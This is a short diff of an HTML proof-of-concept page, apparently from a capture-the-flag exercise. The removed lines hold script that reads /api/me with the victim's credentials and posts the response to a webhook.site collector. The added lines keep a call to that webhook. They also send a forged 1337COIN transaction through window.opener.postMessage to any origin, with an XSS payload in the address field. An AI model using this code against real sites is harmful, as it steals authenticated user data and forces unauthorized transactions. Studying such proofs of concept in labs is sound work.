@@ -6,28 +6,19 @@
   <body>
     <h1>OOO Poc OOO</h1>
     <script>
-fetch("/api/me", {
-    method: "GET",
-    credentials: "include"
-})
-.then(r => r.text())
-.then(d => {
-    fetch("https://webhook.site/9acf5a8d-abd2-4389-8941-68d5198823d8/flag", {
-        method: "POST",
-        headers: {
-            "Content-Type": "application/x-www-form-urlencoded"
-        },
-        body: "data= " + encodeURIComponent(d)
-    });
-});
-
-
+// fetch("/api/me", {
+//     method: "GET",
+//     credentials: "include"
+// })
+// .then(r => r.text())
+// .then(d => {
+    fetch("https://webhook.site/9acf5a8d-abd2-4389-8941-68d5198823d8/flag");
       
       window.opener.postMessage({
     type: 'submitTransaction',
     transaction: {
         currency: '1337COIN',
-        amount: 1,
+        amount: 1337,
         toAddress: '<img src=x onerror=alert(1337)>'
     }
 }, '*');
